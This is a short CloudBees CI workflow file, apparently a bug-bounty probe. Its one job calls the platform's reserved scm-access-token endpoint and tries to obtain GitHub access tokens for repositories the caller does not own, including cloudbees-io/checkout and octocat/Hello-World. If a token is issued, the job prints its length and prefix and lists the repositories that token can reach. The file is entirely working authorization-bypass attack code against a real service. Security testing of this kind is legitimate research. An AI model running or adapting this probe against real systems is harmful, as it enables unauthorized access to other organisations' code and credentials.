apiVersion: automation.cloudbees.io/v1alpha1
kind: workflow
name: probe11

on:
  push:
    branches:
      - main

permissions:
  scm-token-own: read
  scm-token-org: read

jobs:
  tok:
    steps:
      - name: scm-token-scope
        uses: docker://alpine:3.20
        env:
          CBTOK: ${{ cloudbees.api.token }}
          CBURL: ${{ cloudbees.api.url }}
          ORGID: ${{ cloudbees.org.id }}
        run: |
          apk add --no-cache curl jq >/dev/null 2>&1
          probe() {
            echo "--- repo: $1"
            R=$(curl -s -w '\nHTTP:%{http_code}' -X POST -H "Authorization: Bearer $CBTOK" -H 'Content-Type: application/json' --data-raw "{\"scm_repo_url\": \"$1\"}" "$CBURL/reserved/v1/resources/$ORGID/scm-access-token")
            echo "$R" | tail -1
            B=$(echo "$R" | head -n -1)
            TOK=$(echo "$B" | jq -r '.accessToken // empty' 2>/dev/null)
            if [ -n "$TOK" ]; then
              echo "TOKEN len=${#TOK} prefix=$(echo "$TOK" | cut -c1-6)"
              curl -s -o /dev/null -w '  gh-installation-repos:%{http_code}\n' -H "Authorization: Bearer $TOK" https://api.github.com/installation/repositories
              curl -s -H "Authorization: Bearer $TOK" https://api.github.com/installation/repositories | jq -r '.repositories[]?.full_name' 2>/dev/null | head -5
            else
              echo "  no token: $(echo "$B" | head -c 150)"
            fi
          }
          probe "https://github.com/huntbugbounty/cb-unify-test"
          probe "https://github.com/cloudbees-io/checkout"
          probe "https://github.com/octocat/Hello-World"
